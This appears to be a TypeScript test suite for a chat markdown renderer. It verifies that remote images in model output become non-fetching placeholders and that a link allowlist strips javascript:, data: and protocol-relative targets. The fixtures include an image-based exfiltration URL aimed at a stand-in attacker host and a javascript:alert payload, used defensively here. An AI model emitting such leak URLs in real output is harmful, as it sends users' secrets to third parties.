// markdown-remote-image-guard.test.tsx — issue #143 (batch
// batch-143-203-204-212-213-215): the renderer never turns model output into
// network requests. `data:`/`blob:` image sources render inline (local bytes
// only); every other source renders a non-fetching placeholder with a
// deliberate-open link; the N10 link policy is preserved byte-for-byte; and
// anchors never nest.
//
// Frozen-check rows: `remote-image-not-fetched` (C1) and
// `data-url-image-renders-inline` (C2 — also carries the N10 href-preservation
// and no-nested-anchor assertions). The `href-policy-preserved` row is a
// full-suite co-pin outside the frozen battery. Rows are plain it() — never
// conditionally skipped.
import { render } from '@testing-library/react';
import { describe, expect, it } from 'vitest';
import { MarkdownRenderer } from '../MarkdownRenderer';

describe('MarkdownRenderer remote-image guard (issue #143)', () => {
  it('remote-image-not-fetched: a remote markdown image never renders a fetched img', () => {
    const { container } = render(
      <MarkdownRenderer content={'![x](https://evil.example/leak?d=SECRET)'} />,
    );
    // AC1: no <img> with any remote source exists — nothing can be fetched.
    const remoteImgs = Array.from(container.querySelectorAll('img')).filter((el) =>
      /^(https?:)?\/\//i.test(el.getAttribute('src') ?? ''),
    );
    expect(remoteImgs).toEqual([]);
    expect(container.querySelectorAll('img')).toHaveLength(0);
    // The non-fetching placeholder renders with a deliberate-open link.
    const placeholder = container.querySelector('.chat-md__img-placeholder');
    expect(placeholder).not.toBeNull();
    const link = placeholder?.querySelector('a');
    expect(link?.getAttribute('href')).toBe('https://evil.example/leak?d=SECRET');
    expect(link?.getAttribute('rel')).toContain('noopener');
    // The link is the ONLY anchor — nothing else wraps the placeholder.
    expect(container.querySelectorAll('a')).toHaveLength(1);
  });

  it('data-url-image-renders-inline: data and blob sources render inline; N10 href policy and no-nested-anchor hold', () => {
    // AC2: local sources render as a real inline <img> (local bytes only).
    const dataCase = render(<MarkdownRenderer content={'![d](data:image/png;base64,AAAA)'} />);
    const dataImg = dataCase.container.querySelector('img');
    expect(dataImg).not.toBeNull();
    expect(dataImg?.getAttribute('src')).toBe('data:image/png;base64,AAAA');

    const blobCase = render(<MarkdownRenderer content={'![b](blob:http://localhost/x)'} />);
    const blobImg = blobCase.container.querySelector('img');
    expect(blobImg?.getAttribute('src')).toBe('blob:http://localhost/x');

    // N10 preserved: data: HREFS are still stripped (key-aware transform
    // keeps them for src only). Named mutant: loosen the N10 branch (keep
    // data:/blob: for href) and this must go red.
    const hrefCase = render(<MarkdownRenderer content={'[t](data:text/html,hello)'} />);
    expect(hrefCase.container.querySelector('a')).toBeNull();
    expect(hrefCase.container.textContent).toContain('t');

    // N10 preserved: https links still work.
    const okCase = render(<MarkdownRenderer content={'[t](https://ok.example/x)'} />);
    expect(okCase.container.querySelector('a')?.getAttribute('href')).toBe('https://ok.example/x');

    // Linked image (image inside a link): no nested anchors AND no fetched img.
    const nested = render(
      <MarkdownRenderer content={'[![alt](https://img.example/x.png)](https://link.example/y)'} />,
    );
    expect(nested.container.querySelectorAll('a a')).toHaveLength(0);
    expect(nested.container.querySelectorAll('img')).toHaveLength(0);
    // The outer link survives, and the placeholder shows the URL as plain text.
    const outer = nested.container.querySelector('a');
    expect(outer?.getAttribute('href')).toBe('https://link.example/y');
    expect(nested.container.querySelector('.chat-md__img-url')?.textContent).toBe(
      'https://img.example/x.png',
    );
  });

  it('href-policy-preserved: the N10 allowlist matrix is unchanged for links', () => {
    const matrix: Array<[string, string | null]> = [
      // [markdown link target, expected rendered href (null = stripped)]
      ['javascript:alert(1)', null],
      ['data:text/html,hello', null],
      ['blob:http://localhost/x', null],
      ['//evil.example/x', null],
      ['/settings', null],
      ['relative/path', null],
      ['#section', '#section'],
      ['https://ok.example/x', 'https://ok.example/x'],
      ['http://ok.example/x', 'http://ok.example/x'],
      ['mailto:a@b.example', 'mailto:a@b.example'],
      ['tel:+15550100', 'tel:+15550100'],
    ];
    for (const [target, expectedHref] of matrix) {
      const { container } = render(<MarkdownRenderer content={`[t](${target})`} />);
      const a = container.querySelector('a');
      if (expectedHref === null) {
        expect(a, `target ${target} must be stripped`).toBeNull();
      } else {
        expect(a?.getAttribute('href'), `target ${target}`).toBe(expectedHref);
      }
    }
  });
});
